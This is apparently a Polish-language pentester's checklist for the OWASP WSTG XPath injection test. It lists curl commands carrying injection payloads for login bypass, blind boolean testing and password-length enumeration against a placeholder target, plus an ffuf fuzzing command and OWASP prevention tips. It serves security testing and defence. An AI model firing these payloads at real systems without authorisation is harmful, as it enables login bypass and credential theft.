# WSTG-INPV-09 — Testing for XPath Injection

## Cele

- Identify XPATH injection points

## KOMENDY

### Reczne testowanie XPath

```bash
curl -s "https://TARGET/search?user=admin' or '1'='1"
curl -s "https://TARGET/search?user=admin' or ''='"
curl -s "https://TARGET/search?user='] | //user/*[contains(,'admin"
curl -s "https://TARGET/login" -X POST -d "username=admin' or '1'='1&password=anything"

```

### Blind XPath injection

```bash
curl -s "https://TARGET/search?user=admin' and '1'='1" | wc -c
curl -s "https://TARGET/search?user=admin' and '1'='2" | wc -c

```

### XPath enumeration

```bash
curl -s "https://TARGET/search?user=admin' and string-length(//user[1]/password)>5 and '1'='1"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XPath reference

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/XPATH Injection/README.md

```

### fuzzdb XPath

```bash
ffuf -u "https://TARGET/search?user=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/xpath/xpath-injection.txt -mc all -o output_ffuf_xpath.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj endpointy ktore moga uzywac XML/XPath do zapytan
2. Wstaw apostrof i obserwuj bledy XPath w odpowiedzi
3. Testuj boolean-based blind XPath injection
4. Sprawdz czy da sie wyciagnac dane przez substring extraction
5. Uzyj Burp Repeater do precyzyjnego testowania payloadow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md

- Uzywaj parameterized XPath queries (precompiled expressions)
- Waliduj input — ogranicz dozwolone znaki (alfanumeryczne)
- Nie buduj XPath expressions przez konkatenacje user input
- Rozważ uzycie JSON/SQL zamiast XML/XPath

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.
